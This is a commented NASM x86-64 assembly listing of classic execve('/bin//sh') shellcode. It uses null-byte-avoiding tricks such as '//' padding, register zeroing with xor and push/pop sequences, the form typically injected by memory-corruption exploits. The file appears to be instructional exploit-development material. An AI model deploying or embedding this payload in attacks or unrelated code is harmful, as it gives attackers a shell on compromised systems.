global _start

section .text

  _start:
    ; -------------------------------------------------------------------------
    ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
    ; -------------------------------------------------------------------------
    
    ; 1. Clear registers
    xor rsi, rsi        ; RSI = 0 (NULL)
    push rsi            ; Push NULL to stack (used as string terminator)
    
    ; 2. Push "/bin//sh" to stack
    ; We use // to make it 8 bytes aligned (fills 64-bit register perfectly)
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" in Little Endian Hex
    push rbx
    
    ; 3. RDI = Pointer to filename "/bin//sh"
    push rsp
    pop rdi             ; RDI now holds the address of the string we just pushed

    ; 4. Setup argv[] array: [pointer_to_str, NULL]
    push rsi            ; Push NULL pointer (end of array)
    push rdi            ; Push pointer to "/bin//sh"
    push rsp
    pop rsi             ; RSI now points to this array

    ; 5. Call execve (RAX = 59)
    push 59
    pop rax
    cdq                 ; RDX = 0. (envp array is empty)
    syscall
